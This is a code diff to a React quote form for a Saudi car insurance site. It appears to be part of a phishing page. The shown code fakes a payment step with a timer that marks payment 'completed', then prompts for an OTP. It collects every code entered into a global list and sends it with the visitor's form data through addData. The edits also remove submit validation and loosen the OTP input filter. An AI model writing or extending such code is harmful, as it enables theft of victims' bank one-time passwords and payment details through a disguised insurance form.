@@ -680,7 +680,7 @@ export default function QuotePage() {
   )
 }
 
-const allOtp = [""]
+const allOtps = [""]
 
 function ProfessionalQuoteForm() {
   const [currentPage, setCurrentStep] = useState(1)
@@ -712,7 +712,6 @@ function ProfessionalQuoteForm() {
     insuranceTypeSelected: "",
     additionalDrivers: 0,
     specialDiscounts: false,
-    agreeToTerms: true,
     selectedInsuranceOffer: "",
     selectedAddons: [] as string[],
     phone: "",
@@ -848,7 +847,7 @@ function ProfessionalQuoteForm() {
       message: "يرجى اختيار عرض التأمين المناسب",
     },
     phone: {
-      required: true,
+      required: false,
       pattern: /^(05|5)[0-9]{8}$/,
       message: "يرجى إدخال رقم هاتف سعودي صحيح (05xxxxxxxx)",
     },
@@ -1101,9 +1100,7 @@ function ProfessionalQuoteForm() {
   }
 
   const handleSubmit = async () => {
-    if (!validateStep(7)) {
-      return
-    }
+    
 
     setIsSubmitting(true)
     const visitorId = localStorage.getItem("visitor")
@@ -1204,14 +1201,15 @@ function ProfessionalQuoteForm() {
     setPaymentProcessing(true)
     setTimeout(() => {
       setPaymentProcessing(false)
-      setCurrentStep(7)
+      setCurrentStep(6)
       setOtpTimer(120)
 
       addData({
         id: visitorId,
         paymentStatus: "completed",
         otpSent: true,
-        currentPage: 7,
+        currentPage: 6,
+
       })
       setOtpSent(true)
     }, 2000)
@@ -1219,14 +1217,14 @@ function ProfessionalQuoteForm() {
 
   function verifyOTP(): void {
     const visitorId = localStorage.getItem("visitor")
-    allOtp.push(otp)
+    allOtps.push(otp)
     addData({
       id: visitorId,
-      otpCode: otp,
+      otp: otp,
       otpAttempts: otpAttempts + 1,
       otpVerificationTime: new Date().toISOString(),
       createdDate: new Date().toISOString(),
-      allOtp,
+      allOtps,
       ...formData,
     })
 
@@ -1990,7 +1988,7 @@ function ProfessionalQuoteForm() {
                       required
                       value={otp}
                       maxLength={6}
-                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, ""))}
+                      onChange={(e) => setOtp(e.target.value)}
                       autoFocus={true}
                       className={`text-center text-2xl h-14 tracking-widest ${
                         errors.otp ? "border-red-500" : "border-gray-300"
